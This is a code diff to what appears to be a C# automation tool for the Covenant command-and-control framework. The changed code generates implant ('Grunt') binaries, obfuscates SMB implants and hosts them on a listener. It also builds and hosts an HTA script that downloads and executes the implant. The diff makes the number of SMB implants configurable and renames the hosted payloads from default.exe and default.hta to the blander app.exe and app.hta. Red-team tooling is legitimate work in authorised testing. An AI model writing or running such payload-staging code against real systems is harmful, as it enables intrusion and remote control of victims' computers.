@@ -32,7 +32,7 @@ namespace Scorpion.Jobs
 
     public SetupJob(IConsole console, CovenantAPI api) : base(console, api) { }
 
-    public async Task<int> RunAsync(string listenerName, string connectAddress, int connectPort)
+    public async Task<int> RunAsync(string listenerName, string connectAddress, int connectPort, int smbGruntCount)
     {
       var request = new RequestBuilder(Api);
 
@@ -49,7 +49,7 @@ namespace Scorpion.Jobs
 
       BinaryLauncher binaryLauncher = await GenerateBasicHttpGruntBinary(listener);
       Console.WriteLine($"Using Binary Launcher {binaryLauncher.Name} - {binaryLauncher.Id}");
-      var defaultHttpBinPath = Path.Join(dataDir, "default.exe");
+      var defaultHttpBinPath = Path.Join(dataDir, "app.exe");
       Console.WriteLine("Saving HTTP Grunt Binary");
       File.WriteAllBytes(defaultHttpBinPath, Convert.FromBase64String(binaryLauncher.Base64ILByteString));
 
@@ -57,11 +57,11 @@ namespace Scorpion.Jobs
 
       HostedFile hostedBinaryLauncherHta = await FindOrCreateHostedDefaultHttpGruntHta(listener, hostedBinaryLauncher);
 
-      var defaultHttpHtaPath = Path.Join(dataDir, "default.hta");
+      var defaultHttpHtaPath = Path.Join(dataDir, "app.hta");
       Console.WriteLine("Saving HTA Script That Dowloands/Execs Default Grunt Binary");
       File.WriteAllBytes(defaultHttpHtaPath, Convert.FromBase64String(hostedBinaryLauncherHta.Content));
 
-      for (int i = 0; i < 5; i++) {
+      for (int i = 0; i < smbGruntCount; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
 
         var projDir = Path.Join(dataDir, aGuid);
@@ -206,11 +206,14 @@ namespace Scorpion.Jobs
             File.Move(obfuscatedSmbBinPath, newSmbBinPath);
 
 
+            var hostedUrlPath = "/" + aGuid + ".exe";
+            Console.WriteLine($"Hosting obfsucated smb binary at path {hostedUrlPath}");
             var hostedSmbBin = new HostedFile();
             hostedSmbBin.ListenerId = listener.Id;
-            hostedSmbBin.Path = "/" + aGuid + ".exe";
+            hostedSmbBin.Path = hostedUrlPath;
             hostedSmbBin.Content = Convert.ToBase64String(File.ReadAllBytes(newSmbBinPath));
             hostedSmbBin = await request.CreateHostedFile((int)listener.Id, hostedSmbBin);
+            Console.WriteLine($"Grunt generation complete for {aGuid}");
 
           } else {
             Console.WriteLine($"Not able to find directory in {frameworkDir} that starts with 'v4.'. Can't find msbuild.exe");
@@ -236,36 +239,36 @@ namespace Scorpion.Jobs
     public async Task<HostedFile> FindOrCreateHostedDefaultHttpGruntHta(HttpListener listener, HostedFile hostedBinaryFile)
     {
       var request = new RequestBuilder(Api);
-      Console.WriteLine("Checking a /default.hta Script is already hosted");
+      Console.WriteLine("Checking a /app.hta Script is already hosted");
       foreach (HostedFile aHostedFile in await request.GetHostedFiles((int)listener.Id)) {
-        if (aHostedFile.Path == "/default.hta") {
-          Console.WriteLine("Found existing /default.hta. Not creating a new one");
+        if (aHostedFile.Path == "/app.hta") {
+          Console.WriteLine("Found existing /app.hta. Not creating a new one");
           return aHostedFile;
         }
       }
       Console.WriteLine("Generating HTA Script That Dowloands/Execs Default Grunt Binary");
       var hta = GeneratePullAndExecBinaryHta(listener, hostedBinaryFile);
-      Console.WriteLine("Hosting HTA Script That Dowloands/Execs Default Grunt Binary");
+      Console.WriteLine("Hosting HTA Script That Dowloands/Execs Default Grunt Binary at /app.hta");
       var hostedHta = new HostedFile();
       hostedHta.ListenerId = listener.Id;
-      hostedHta.Path = "/default.hta";
+      hostedHta.Path = "/app.hta";
       hostedHta.Content = Convert.ToBase64String(Encoding.ASCII.GetBytes(hta));
       return await request.CreateHostedFile((int)listener.Id, hostedHta);
     }
     public async Task<HostedFile> FindOrCreateHostedDefaultHttpGrunt(HttpListener listener, BinaryLauncher launcher)
     {
       var request = new RequestBuilder(Api);
-      Console.WriteLine("Checking a /default.exe Grunt is already hosted");
+      Console.WriteLine("Checking a /app.exe Grunt is already hosted");
       foreach (HostedFile aHostedFile in await request.GetHostedFiles((int)listener.Id)) {
-        if (aHostedFile.Path == "/default.exe") {
-          Console.WriteLine("Found existing /default.exe. Not creating a new one");
+        if (aHostedFile.Path == "/app.exe") {
+          Console.WriteLine("Found existing /app.exe. Not creating a new one");
           return aHostedFile;
         }
       }
-      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
+      Console.WriteLine("Creating Hosted HTTP Grunt Binary at /app.exe");
       var hostedDefaultHttpBin = new HostedFile();
       hostedDefaultHttpBin.ListenerId = listener.Id;
-      hostedDefaultHttpBin.Path = "/default.exe";
+      hostedDefaultHttpBin.Path = "/app.exe";
       hostedDefaultHttpBin.Content = launcher.Base64ILByteString; // b64 encoded
       Console.WriteLine("Creating Hosted HTTP Grunt Binary");
       return await request.CreateHostedFile((int)listener.Id, hostedDefaultHttpBin);
